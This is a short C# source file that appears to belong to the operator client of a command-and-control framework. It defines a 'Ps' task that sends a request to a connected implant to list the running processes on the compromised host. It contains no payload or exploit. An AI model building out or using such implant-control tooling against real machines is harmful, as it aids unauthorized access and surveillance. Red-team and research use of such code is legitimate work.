using Client.Models;

using static Client.Models.Client;


namespace Client.Utils.TaskUtils.AdminUtils
{
    class Ps : Models.AdminTask
    {
        public override string TaskName => "Ps";

        public override string Desc => "View all currently running processes";

        public override string AdminUtilExec(string[] opts)
        {
            try
            {

                if (opts != null && opts.Length > 1) { throw new AtlasException($"[*] Usage: Ps\n"); }
                if (CurrentImplant is null) { throw new AtlasException("[-] No connected implant"); }

                return TaskOps.sendAdminUtil(TaskName);

            }
            catch (AtlasException e) { return e.Message; }
        }
    }
}
